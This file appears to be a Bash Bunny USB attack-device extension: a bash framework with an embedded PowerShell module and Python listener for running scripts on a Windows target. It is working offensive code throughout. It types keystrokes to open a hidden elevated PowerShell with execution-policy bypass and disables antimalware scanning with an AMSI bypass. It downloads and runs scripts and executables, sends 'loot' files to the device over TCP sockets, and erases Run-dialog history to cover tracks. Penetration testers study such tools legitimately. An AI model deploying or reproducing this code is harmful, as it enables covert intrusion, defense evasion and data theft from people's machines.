#!/bin/bash
#
# Title:         Bashbunny Powershell Framework
# Description:	 Facilitates running powershell scripts, loading powershell modules and exfiltrating loot using either storage or network methods 
# 				 "NET" - Sets up Ethernet and HID interfaces; uses HID to load powershell scripts via local web server on the bashbunny. 
# 			     "STORAGE" - Sets up a mass storage device and HID interfaces; uses HID to load powershell scripts via local web server on the bashbunny. 
# 				 Exfiltrates through either Ethernet (using sockets) or mass storage onto the Bashbunny
# Author:        p3rki3
# Props:		 Dominic Chell (MDSec) for the AMSI bypass.  Other bypasses exist and your mileage may vary - if in doubt, inject your own
# Version:       0.91
# Category:		 extension
# Target:		 Windows 10 (Powershell) - untested with earlier versions of windows
# Dependencies:  gohttp
# Attackmodes:   HID + one or both of Ethernet, Mass Storage
# Runtime:		 varies
######## LED STATES ################################################################################################
#
#	MAGENTA SLOW BLINK		NET ACCESSMETHOD selected
#	MAGENTA FAST BLINK		STORAGE ACCESSMETHOD selected
#   MAGENTA SOLID 			Starting up the framework
#   CYAN 	SLOW BLINK	 	Waiting for your loot to exfil ("NET" mode only)
#   RED		SOLID			Framework exited with a fatal error - see fail.dbg in the switch folder for details
#   Multicolour	Blink 		Framework closing down normally
####################################################################################################################

BBPS_VERSION = "0.91"

######## FUNCTIONS ########
# This function is called when the framework hits a fatal error - it writes a failure message to fail.dbg on the bashbunny 
# and sets a RED LED status before exiting the payload with an error status
function BBPS_FRAMEWORK_FAIL() {
    FAILMSG="$1"
	echo "[-] $FAILMSG" > fail.dbg
    LED FAIL
    exit 1
}
export -f BBPS_FRAMEWORK_FAIL

# This function is used to output debug messages to bbps.dbg on the bashbunny.  These messages are placed in each main framework 
# function but are only printed if the variable $DEBUGBBPS is set to "ON" by INVOKE_POWERSHELL having "ON" as its 3rd parameter
function bbps_debug() {
    DEBUGMSG="$1"
    if [ "$DEBUGBBPS" = "ON" ]
    then
        echo "[+] $DEBUGMSG" >> bbps.dbg
    fi
}
export -f bbps_debug

# This function sets up the correct ATTACKMODE, ensures that all framework helper files are created if not in the payload directory,
# loads an admin powershell instance on the target machine and injects a powershell module of helper functions into powershell.
# The initiialisation function of the injected module is called here, and sets up powershell to work with the framework. including an AMSI bypass
function INVOKE_POWERSHELL() {
    #REQUIRETOOL gohttp     # commented out - gohttp doesn't leave a directory behind when it installs which is what REQUIRETOOL checks for
	ACCESSMETHOD=${1:-"NET"}
    LOUDNESS=${2:-"QUIET"}
	DEBUGBBPS=${3:-"OFF"}
    GET SWITCH_POSITION

	if [ -z $SLEEPTIME ]
    then
	    SLEEPTIME="1"
	fi
	
    cd /root/udisk/payloads/$SWITCH_POSITION
    mkdir -p loot
	rm ./loot/*
    if [ -f fail.dbg ]
	then
	    rm fail.dbg
	fi
    if [ -f bbps.dbg ]
	then
	    rm bbps.dbg
	fi

    bbps_debug "Entering INVOKE_POWERSHELL version $BBPS_VERSION with parameters $ACCESSMETHOD $LOUDNESS $DEBUGBBPS"
	
	if [ -f BBFwork.psm1 ]
	then
	    rm BBFwork.psm1
	fi
    if [ -f receiver.py ]
	then
	    rm receiver.py
	fi
	
    bbps_debug "Creating the Framework BBFwork.psm1 file"
	create_bbfwork

	if [ "$ACCESSMETHOD" != "STORAGE" ]
	then
        bbps_debug "Creating the Framework receiver.py file"
	    create_receiver
	fi
	
    case $ACCESSMETHOD in
	  "NET")
		LED M SLOW
        ATTACKMODE RNDIS_ETHERNET HID
		# wait for DHCP to do its magic
		while [ -z $TARGET_HOSTNAME ]; do
		    GET TARGET_HOSTNAME
			sleep 1
		done
        # Start web server on the bash bunny
        gohttp -p 80 &
	    ;;
	  "BOTH")
		LED M SLOW
        ATTACKMODE RNDIS_ETHERNET HID STORAGE
		# wait for DHCP to do its magic
		while [ -z $TARGET_HOSTNAME ]; do
		    GET TARGET_HOSTNAME
			sleep 1
		done
        # Start web server on the bash bunny
        gohttp -p 80 &
	    ;;
	  "STORAGE")
		LED M FAST
        ATTACKMODE STORAGE HID
		;;
	  *)
        BBPS_FRAMEWORK_FAIL "INVOKE_POWERSHELL called without NET or STORAGE as first parameter"
		;;
	esac
    sleep $SLEEPTIME	# let windows catch up with the bunny now presenting an ethernet interface or storage

    bbps_debug "Determining the various debug/visibility combinations"

    case $LOUDNESS in
      "QUIET")
	    DEBUGBBPSFW=''
	    ;;
	  "VISIBLE")
	    DEBUGBBPSFW="YES"
	    ;;
	  *)
	    LOUDNESS="NOISY"
	    DEBUGBBPSFW="YES"
	    ;;
	esac
    LED SETUP

    sleep $SLEEPTIME

    bbps_debug "About to start powershell"

    QUACK GUI r
    QUACK DELAY 500
	if [ -z $DEBUGBBPSFW ]
	then
        QUACK STRING powershell -W Hidden start-process powershell \'-noexit -nop -ex Bypass -W Hidden\' -Verb RunAs
    else
        QUACK STRING powershell start-process powershell \'-noexit -nop -ex Bypass\' -Verb RunAs
    fi
	QUACK ENTER
    sleep $SLEEPTIME
    sleep $SLEEPTIME
    QUACK LEFT
    QUACK ENTER
    sleep $SLEEPTIME

    bbps_debug "About to download the framework module into powershell"

    case $ACCESSMETHOD in
	  "NET" | "BOTH")
        QUACK STRING wget http://172.16.64.1/BBFwork.psm1 -outfile "\$env:TEMP\bbfwork.psm1"
        QUACK ENTER
		QUACK DELAY 200
        QUACK STRING ipmo "\$env:TEMP\bbfwork.psm1"
        QUACK ENTER
		QUACK DELAY 200
	    ;;
	  "STORAGE")
		QUACK STRING \$BB = \(gwmi -class win32_volume -f \{label = \"BASHBUNNY\"\}\).DriveLetter
		QUACK ENTER
		QUACK DELAY 200
		QUACK STRING Import-Module \$BB\\payloads\\$SWITCH_POSITION\\bbfwork.psm1
		QUACK ENTER
		QUACK DELAY 200
        ;;
	esac
    bbps_debug "About to initiate the framework in powershell"

	QUACK STRING Use-BBFwork $ACCESSMETHOD $SWITCH_POSITION $LOUDNESS $DEBUGBBPS
	QUACK ENTER
	QUACK DELAY 200

    bbps_debug "Returning from INVOKE_POWERSHELL"
}
export -f INVOKE_POWERSHELL

# This function injects a powershell module from the bashbunny into the target machine and imports it into powershell for use 
function INJECT_PSMODULE() {
    MODNAME="$1"
	WAITTIME=${2:-"1"}
	if [ ! -f $MODNAME ]
	then    
        BBPS_FRAMEWORK_FAIL "INJECT_PSMODULE called with $MODNAME, but couldn't find that file"
	fi
	bbps_debug "Entering INJECT_PSMODULE with parameter $MODNAME"
    # Requires powershell as the foreground app with focus
    QUACK STRING Import-BBModule \"$MODNAME\" \"$WAITTIME\"
    QUACK ENTER
    bbps_debug "Returning from INJECT_PSMODULE"
}
export -f INJECT_PSMODULE

# This function injects a powershell script from the bashbunny into the target machine and then runs the script.  If loot is expected
# then this function also takes care of setting up a listener for the loot (if using ethernet)
function INJECT_PSSCRIPT() {
    SCRIPTNAME="$1"
	LOOTNAME=${2:-"NOLOOT"}
	if [ ! -f $SCRIPTNAME ]
	then    
        BBPS_FRAMEWORK_FAIL "INJECT_PSSCRIPT called with $SCRIPTNAME, but couldn't find that file"
	fi
	
    bbps_debug "Entering INJECT_PSSCRIPT with parameters $SCRIPTNAME $LOOTNAME"

    QUACK STRING Invoke-BBScript \"$SCRIPTNAME\" \"$LOOTNAME\"
    QUACK ENTER

	if [ "$LOOTNAME" = "NOLOOT" ]
	then
        bbps_debug "No loot required - returning empty handed"
	    return 0
	fi
    bbps_debug "Setting up the Exfil method if required for NET exfiltration"

    case $ACCESSMETHOD in
      "NET" | "BOTH")
 	    SETUP_EXFIL_PSLOOT $2
   	    ;;
      "STORAGE")
	    # User needs to manage a wait until the loot is received before proceeding....
	    ;;
    esac
    bbps_debug "Returning from INJECT_PSSCRIPT"
}
export -f INJECT_PSSCRIPT

# This function injects a file from the bashbunny into the target machine, and optionally executes it - do not use for powershell scripts
function INJECT_PSFILE() {
    BBFILENAME="$1"
	RUNME=${2:-"NOEXEC"}     # If this param is "RUN", then the injected file will be executed in powershell
	if [ ! -f $BBFILENAME ]
	then    
        BBPS_FRAMEWORK_FAIL "INJECT_PSFILE called with $BBFILENAME, but couldn't find that file"
	fi
	
    bbps_debug "Entering INJECT_PSFILE with parameters $SCRIPTNAME $RUNME" 

    QUACK STRING Get-BBFile \"$BBFILENAME\" \"$RUNME\"
    QUACK ENTER

    bbps_debug "Returning from INJECT_PSFILE"
}
export -f INJECT_PSFILE

# This function injects a powershell command into powershell on the target machine.  Use for very simple one-liners only.  
# INJECT_PSSCRIPT is to be prefered for non-trivial lines.  This function will not return loot - use INJECT_PSSCRIPT.
# The function works by creating a temporary script and then calling INJECT_PSSCRIPT anyway.
function INJECT_PSCOMMAND() {
    # We are going to inject a command by saving it to a temporary script file and then injecting the script.
	PSCOMMAND="$1"
	if [-z $PSCOMMAND ]
	then
	    BBPS_FRAMEWORK_FAIL "INJECT_PSCOMMAND - No command supplied in inject!"
	fi
    bbps_debug "Entering INJECT_PSCOMMAND with parameter $PSCOMMAND"

	cat > tmpscrpt.ps1 <<< "$PSCOMMAND" 

	INJECT_PSSCRIPT "tmpscrpt.ps1" "NOLOOT"
    bbps_debug "Returning from INJECT_PSCOMMAND"
}
export -f INJECT_PSCOMMAND

# Helper function that manages loot files being returned from the target machine.  Runs a python based listener if required
# and moves the loot to a temporary loot directory
function SETUP_EXFIL_PSLOOT() {
    LOOTFILE="$1"
    bbps_debug "Entering SETUP_EXFIL_PSLOOT with parameters $LOOTFILE"
    # Note - this function does not return until the loot is received
    LED SPECIAL
    if [ -f $LOOTFILE ]
	then
	    rm $LOOTFILE
	fi
    python receiver.py >> ./loot/rcvr.dbg
    mv loot.fil ./loot/$LOOTFILE
    bbps_debug "Returning from SETUP_EXFIL_PSLOOT"
}
export -f SETUP_EXFIL_PSLOOT

# Helper function cleans up the payload folder on the bash bunny, removing any temporary files created by the framework
# This is called by CLOSE_POWERSHELL and there is usually little need to call it directly from your payload.txt file
function CLEANUP_BB() {
	if [ -d /root/udisk/payloads/$SWITCH_POSITION/loot ]
	then
	    bbps_debug "Found loot folder, so deleting - delete will fail if not empty"
		rmdir /root/udisk/payloads/$SWITCH_POSITION/loot
	fi
	rm BBFwork.psm1
	rm receiver.py
	rm tmpscrpt.ps1
}
export -f CLEANUP_BB

# This function closes down powershell on the target machine, cleaning up the target machine and bashbunny as required/directed
function CLOSE_POWERSHELL() {
    # Cleanup - though the framework doesnt use ATTACKMODE STORAGE, do a sync anyway just in case the user script has done at some point
    # clean up the run line in Windows
    bbps_debug "Entering CLOSE_POWERSHELL with no parameters"
    QUACK STRING Invoke-BBCleanup $LOUDNESS
    QUACK ENTER
    sync
	LEDFLASH
    sync
    LEDFLASH
    CLEANUP_BB	
	LED CLEANUP
    bbps_debug "Returning from CLOSE_POWERSHELL"
}
export -f CLOSE_POWERSHELL

# Usage: LEDFLASH
# Kaleidoscope function to alert the bashbunny user that the framework is cleaning up, which giving time to sync the bashbunny and close
# powershell down on the target machine
function LEDFLASH() {
    LED Y
	sleep 0.2
	LED C
	sleep 0.2
	LED M
	sleep 0.2
	LED W
	sleep 0.2
    LED Y
	sleep 0.2
	LED C
	sleep 0.2
	LED M
	sleep 0.2
    LED OFF
}
export -f LEDFLASH

# Function to move the loot into a proper loot subdirectory without overwriting any previous loot generated by the script.  This 
# enables the script to be run against multiple machines without having to extract the loot between each run.
function STASH_LOOT() {
    LOOTDIR="$1"

    if [ -z $LOOTDIR ]
	then
	    BBPS_FRAMEWORK_FAIL "STASH_LOOT called without a directory name for the loot"
	fi
	
    bbps_debug "Entering STASH_LOOT with parameter $LOOTDIR"

	mkdir -p /root/udisk/loot
	
	i=0
	while [ -d /root/udisk/loot/$LOOTDIR$i ]
	do
	   i=$[$i+1]
	done
	
	mkdir /root/udisk/loot/$LOOTDIR$i 
	mv /root/udisk/payloads/$SWITCH_POSITION/loot/* /root/udisk/loot/$LOOTDIR$i 
	rmdir /root/udisk/payloads/$SWITCH_POSITION/loot
    bbps_debug "Returning from STASH_LOOT"
}
export -f STASH_LOOT

# Function to create the framework powershell module to be injected into the target machine.
# This uses a heredoc to avoid any version issues with different versions of framework files.
function create_bbfwork() {
   cat > BBFwork.psm1 << 'EOF'
########################## Performs some setup for BB Powershell Framework #########################################
function Use-BBFwork
{
<#
.SYNOPSIS
Setup function for BB Powershell Framework.

.DESCRIPTION
Setup function for BB Powershell Framework.
Allows Bashbunny to pass some key environment variables to Powershell, such as access mode and whether to be quiet or not

.EXAMPLE
PS > Use-BBFwork "NET" "switch1" "QUIET"

.LINK
#>

    [CmdletBinding()] Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $MODEV,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $SWITCHV,
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $QUIETV,
        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $DEBUGBBPSV
    )
    $global:MODE = $MODEV
    $global:SWITCH = $SWITCHV
    $global:QUIET = $QUIETV
    $global:DEBUGBBPS = $DEBUGBBPSV
    # AMSI bypass
    $a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null,$null)
    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic, Static").SetValue($null,$a)
    ([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null)) | out-null
    # And repeat - sometimes takes a couple of goes
    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null,$null)
    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic, Static").SetValue($null,$a)
    ([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null)) | out-null
    if ($global:QUIET -ne "QUIET") {
        echo "BashBunny Powershell Framework v0.9 loaded!"
    }
}

########################## Performs some setup for BB Powershell Framework #########################################
function Invoke-BBCleanup
{
<#
.SYNOPSIS
Cleans up powershell and exists BB PS Framework

.DESCRIPTION
Cleans up powershell and exists BB PS Framework
Ejects the bashbunny if it was mounted as storage, and exits powershell if required

.EXAMPLE
PS > Invoke-BBCleanup "QUIET"

.LINK
#>

    [CmdletBinding()] Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $LOUDNESS
    )

    if ($global:MODE -ne "NET") {
        Write-VolumeCache $BB.SubString(0,1)
        $driveEject = New-Object -comObject Shell.Application
        $driveEject.Namespace(17).ParseName($BB.SubString(0,2)).InvokeVerb("Eject")
    }
    if ($LOUDNESS -eq "QUIET") {
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
        exit 0
    }
    if ($LOUDNESS -eq "VISIBLE") {
        exit 0
    }
}
Set-Alias -Name bbcleanup Invoke-BBCleanup

##########################Exfiltrates text file from victim to BashBunny.#########################################
function Invoke-BBExfil 
{

<#
.SYNOPSIS
Payload which exfiltrates a loot file to the Bash Bunny using TCP Socket.

.DESCRIPTION
This payload exfiltrates a loot file to the Bash Bunny using TCP Sockets.
There must be a listener waiting on port 5001 on the bash bunny at IP 172.16.64.1 for the net method

.EXAMPLE
PS > Invoke-BBExfil "$env:TEMP\temp.txt"

.LINK
#>

    [CmdletBinding()] Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $EXFILSRC
    )
    if($global:MODE -eq "STORAGE") {
        Copy-Item $EXFILSRC $BB\payloads\$global:SWITCH\loot\$global:LOOTNAME
        Write-VolumeCache $BB.SubString(0,1)
    } else {
        $exfiltext = [IO.File]::ReadAllText($EXFILSRC)
        $tcpClient = New-Object System.Net.Sockets.TCPClient
        $tcpClient.Connect("172.16.64.1",5001)

        [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($exfiltext)
        $clientStream = $tcpClient.GetStream()
        $clientStream.Write($bytes,0,$bytes.length)
        $clientStream.Flush()
        $clientStream.Close()
    }
}
Set-Alias -Name bbexfil Invoke-BBExfil

##########################Infiltrates and loads a module from a BashBunny.#########################################
function Import-BBModule 
{

<#
.SYNOPSIS
Helper function to infiltrate a powershell module from bashbunny and import into powershell.

.DESCRIPTION
Helper function to infiltrate a powershell module from bashbunny and import into powershell.
There must be a web server running on the bash bunny
This can only be used once per powershell session

.EXAMPLE
PS > Import-BBModule "Powerpreter.psm1" 5

.LINK
#>
    [CmdletBinding()] Param( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $MODNAME,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $WAITTIME
    )
    if($global:MODE -eq "STORAGE") {
        ipmo $BB\payloads\$global:SWITCH\$MODNAME -Global
    } else {
        wget http://172.16.64.1/$MODNAME -outfile $env:TEMP\$MODNAME
        Start-Sleep -Seconds $WAITTIME
        ipmo $env:TEMP\$MODNAME -Global
    }
}
Set-Alias -Name bbipmo Import-BBModule

##########################Infiltrates and runs a script from a BashBunny.#########################################
function Invoke-BBScript 
{

<#
.SYNOPSIS
Helper function to infiltrate a powershell script from bashbunny and run it in the current powershell session.

.DESCRIPTION
Helper function to infiltrate a powershell script from bashbunny and run it in the current powershell session.
There must be a web server running on the bash bunny if you are going to exfiltrate the script output, which
will be piped into a temporary file $env:TEMP\tmp.txt 
This can be used multiple time per powershell session

.EXAMPLE
PS > Invoke-BBScript "Stage1.psm1"

.LINK
#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $SCRIPTNAME,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $LOOTNAMEV
    )
    $global:LOOTNAME=$LOOTNAMEV
    if($global:MODE -eq "STORAGE") {
        & $BB\payloads\$global:SWITCH\$SCRIPTNAME > $env:TEMP\tmp.txt
    } else {
        wget http://172.16.64.1/$SCRIPTNAME -outfile $env:TEMP\tmp.ps1 
        & $env:TEMP\tmp.ps1 > $env:TEMP\tmp.txt
    }
}
Set-Alias -Name bbexec Invoke-BBScript

##########################Infiltrates and runs a script from a BashBunny.#########################################
function Get-BBFile 
{

<#
.SYNOPSIS
Helper function to infiltrate a file from bashbunny into the powershell temporary space in the current session.

.DESCRIPTION
Helper function to infiltrate a file from bashbunny and into the current powershell session.  The file is stored
in the temporary directory $env:TEMP
If the infiltrated file is an executable, it can be run in powershell using the powershell command
   & $env:TEMP\<filename>
This can be used multiple time per powershell session

.EXAMPLE
PS > Inject_BBFile "cpuz.exe" "run"

.LINK
#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $BBFILENAME,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FILERUN
    )
    if($global:MODE -eq "STORAGE") {
        copy $BB\payloads\$global:SWITCH\$BBFILENAME $env:TEMP\$BBFILENAME
    } else {
        wget http://172.16.64.1/$BBFILENAME -outfile $env:TEMP\$BBFILENAME 
    }
	if($FILERUN -eq "RUN" ) {
	    & $env:TEMP\$BBFILENAME
	}
}
Set-Alias -Name bbfile Get-BBFile

EOF
}
export -f create_bbfwork

# Function to create the framework python receiver script used to receive loot over a network socket.
# This uses a heredoc to avoid any version issues with different versions of framework files.
function create_receiver() {
   cat > receiver.py << 'EOF'
import socket
import os
SERVER_HOST = "172.16.64.1"
SERVER_PORT = 5001
BUFFER_SIZE = 4096
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print "[+] Listening as", SERVER_HOST, ":", SERVER_PORT
client_socket, address = s.accept()
print "[+]", address, "is connected."
with open("loot.fil", "wb") as f:
    while True:
        bytes_read = client_socket.recv(BUFFER_SIZE)
        if not bytes_read:
            break
        f.write(bytes_read)
client_socket.close()
s.close()
print "[+] All done!"
EOF
}
export -f create_receiver
